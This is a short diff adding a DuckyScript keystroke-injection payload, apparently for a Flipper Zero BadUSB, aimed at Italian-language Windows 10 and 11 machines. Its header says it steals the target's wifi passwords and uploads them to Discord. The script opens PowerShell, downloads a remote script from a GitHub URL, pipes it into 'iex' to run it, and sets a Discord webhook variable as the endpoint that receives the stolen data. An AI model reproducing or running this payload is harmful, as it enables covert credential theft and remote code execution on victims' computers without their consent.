@@ -1,0 +1,17 @@
+REM     Title: Uaifai
+
+REM     Author: dezko
+
+REM     Description: This payload grabs your target's wifi passwords and uploads them to Discord.
+
+REM     Target: Windows 10, 11 (administrator) - Italian
+
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1500
+STRING $dc='your Discord webhook';irm https://raw.githubusercontent.com/Desko21/FlipperZero/refs/heads/main/Uaifai/uaifai.ps1 | iex
+ENTER
+STRING exit
+ENTER
